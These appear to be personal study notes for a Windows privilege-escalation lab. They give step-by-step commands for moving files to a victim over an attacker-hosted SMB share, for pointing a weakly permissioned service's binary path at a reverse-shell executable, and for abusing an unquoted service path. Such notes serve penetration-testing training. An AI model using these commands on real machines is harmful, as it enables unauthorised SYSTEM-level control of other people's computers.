


# File Transfers

 Run this following command on the directory including the file and this will start a smb share of that dir

> sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py directoryname .

- Now on victim machine  

> copy \\IP\directoryname\filename localpathwheretosave




# Privilege escalation


### Insecure Service Permissions

this exploit is like path manipulation.WE see that if we have permissions to change settings of a certain service
and we can stop or start the service then we can poiny it to our malicious executable file and when we restart the service
our executable run as SYSTEM



we can use following command to see permissions of services using winpeas

> .\winpeas.exe servicesinfo

we get the services which we can possibly modify

Now we use accesschk.exe to see the which permissions we can abuse of that service

> .\accesschk.exe /accepteula -uwcqv username servicename

!!This vector only work if we have stop or start service permission available else its a rabithole.
!! The service must also have SERVICE_CHANGE_CONFIG which allows us to modify permissions


Now we can interact with service 

> sc qc servicename

!!The service must also have SERVICE_START_NAME set to system so we know it runs as SYSTEM.

Now we will change the BInarypath to  our executable

> sc config servicename binpath= "\"C:\PrivEsc\reverse.exe\""


We can see the status of service by

> sc query servicename

 If it is running then we have to stop the service and again start the service

If it is stopped then just start the service and our file will be executed

> net start servicename


### Unquoted service path

we can abuse this service due to insecure path validity in windows. service name is unquotedsvc
 suppose we have a path

c:\program files\common files\file.exe

when we run file.exe using absolute path,windows call unquotedsvc to check each possible directory to see if it is 
executable or not .That means first windows will check\program to see if  its an exectuable,if not then it will check
\common as executable and then like this we run our proper executable. So we cann add our executable before the original file
and execute that


Fist query the unquotedsvc to see if we have proper start,stop and system permission for the service

After confirming this we have to see which path is writable so we can write

we can find that by using.We gradually see all the partial directories to see if its writable .NOte this
c:\programfiles\unquotedpathserviece is just an example

> \accesschk.exe /accepteula -uwdq "C:\"

> \accesschk.exe /accepteula -uwdq "C:\Program Files\"

> \accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"  

Now just move our malicuous file to a writable path so its executed before the original

> copy exploit.exe "C:\Program Files\Unquoted Service Files\exploit.exe"


Now just start the unquotedsvc

> net start unquotedsvc 



















# ####

















